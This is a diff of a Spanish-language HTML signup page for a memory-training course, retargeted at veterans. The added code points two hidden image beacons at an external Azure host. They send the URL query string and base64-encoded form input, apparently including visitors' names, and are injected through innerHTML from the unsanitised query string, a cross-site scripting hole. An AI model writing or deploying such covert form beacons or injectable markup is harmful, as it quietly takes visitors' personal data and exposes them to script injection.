@@ -56,8 +56,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>Regístrate en "El Palacio de la Memoria"!</h1>
-        <img src="https://crmwinafin.github.io/crmwinafin/imagen_promocional.jpg" alt="Castillo de la Memoria" class="promo-image">
+        <h1>Regístrate en "El Palacio de la Memoria para Veteranos"!</h1>
+        <img src="https://winafin.norwayeast.cloudapp.azure.com/empresas/Integracionecuador/PALACIO.JPG" alt="Castillo de la Memoria" class="promo-image">
         <p>Descubre técnicas avanzadas para potenciar tu memoria y recordar con facilidad.</p>
         <form name="formulario_12" method="POST" action="gethint.asp" onsubmit="return enviar();">
             <div class="form-group">
@@ -84,7 +84,7 @@
 	
 	var sPaginaURL 	= window.location.search.substring(1);
 	var sPagina1	= sPaginaURL;
-	var macro_x = '<IMG SRC="http://localhost/cnt.asp?'+sPagina1+'">';
+	var macro_x = '<IMG SRC="https://winafin.norwayeast.cloudapp.azure.com/cnt.asp?'+sPagina1+'">';
 	document.getElementById("demo").innerHTML = macro_x;
 	
 
@@ -105,7 +105,7 @@
 
 		macro_d = btoa(macro_d + "@*" + sPaginaURL);
 
-	  	var macro_x = '<IMG SRC="http://localhost/convert.asp?'+macro_d+'">';
+	  	var macro_x = '<IMG SRC="https://winafin.norwayeast.cloudapp.azure.com/convert.asp?'+macro_d+'">';
 	  	document.getElementById("demo").innerHTML = macro_x;
 
 		var paso_tk = traslado_a(document.formulario_12.nombre.value);
